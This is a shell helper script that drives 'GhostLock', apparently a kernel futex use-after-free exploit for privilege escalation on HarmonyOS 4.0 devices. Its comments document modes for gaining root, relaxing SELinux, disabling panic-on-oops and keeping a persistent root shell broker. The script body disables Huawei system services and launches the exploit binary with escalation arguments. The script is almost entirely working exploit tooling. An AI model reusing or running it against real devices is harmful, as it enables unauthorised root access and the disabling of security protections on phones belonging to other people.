#!/system/bin/sh
# Device-side run helper for GhostLock-GOT-W29 (HarmonyOS 4.0, shell uid).
#
#   adb push exploit/ghostlock-source/build/bin/ghostlock_exe /data/local/tmp/
#   adb push tools/device-run.sh /data/local/tmp/
#   adb shell sh /data/local/tmp/device-run.sh                 # escalate (default)
#   adb shell sh /data/local/tmp/device-run.sh --verify-write  # carrier write only
#   adb shell sh /data/local/tmp/device-run.sh --bench 10      # success rate
#   adb shell sh /data/local/tmp/device-run.sh --root          # + tmpfs/4755 endgame
#   adb shell sh /data/local/tmp/device-run.sh --selinux-relax # initialized=0 + AVC
#   adb shell sh /data/local/tmp/device-run.sh --su-server     # persistent @gl_su
#
# Device-day order (see README "SELinux"): --selinux-relax, then verify with a
# known-denied operation; --su-server keeps a root broker alive for mounts and
# shells (drive it with `ghostlock_exe --rsh 'CMD'` from another shell).
#
# Note: this device ships with panic_on_oops=1, so a clobbered attempt panics
# instead of merely wedging a core -- and one failure already ends that boot, so
# retrying inside it (--attempts N>1) is pointless.  --root (and the standalone
# --harden) leaf-zero panic_on_oops first; only do that if the device does NOT
# reboot by itself after a panic, otherwise the automatic reboot is the cleaner
# recovery path (see README "安全边界").
#
# Safety: the exploit parks/stops itself after a consumed dangling pointer; do
# NOT `kill -9` it (futex_exit_release would walk the dangling pi_blocked_on).
# To stop it use `kill -STOP`, and prefer a reboot to clean up.
TMP="${TMPDIR:-/data/local/tmp}"
EXE="$TMP/ghostlock_exe"
LOG="$TMP/gl.log"

if [ ! -x "$EXE" ]; then
  echo "push the exploit first: adb push ghostlock_exe $TMP/" >&2
  exit 1
fi

echo "== model: $(getprop ro.product.model 2>/dev/null) / $(uname -r)"
echo "== uid: $(id)"

# The PI-ring trigger needs the root cpuset: powergenie/iaware otherwise keep
# the shell in a restricted cpuset and the requeue path never reaches the
# EDEADLK branch (see README "触发前提").
if pm list packages 2>/dev/null | grep -q com.huawei.powergenie; then
  pm disable-user com.huawei.powergenie >/dev/null 2>&1 || true
fi
if pm list packages 2>/dev/null | grep -q com.huawei.iaware; then
  pm disable-user com.huawei.iaware >/dev/null 2>&1 || true
fi

# Default: prove uid 0 end to end; --hold leaves the root child stopped rather
# than exiting into futex_exit_release.
ARGS="$*"
[ -z "$ARGS" ] && ARGS="--escalate --no-rt --attempts 1 --hold"

sync
: > "$LOG"
echo "== running: $EXE $ARGS --log-file $LOG"
# If the output shows no EDEADLK (requeue ret != -1/35), retry with
# --probe-cycle: the value-holding ring is stable on some firmware.
"$EXE" $ARGS --log-file "$LOG"
rc=$?
echo "== exit=$rc"
echo "== last lines of $LOG:"
tail -n 25 "$LOG" 2>/dev/null
sync
exit $rc
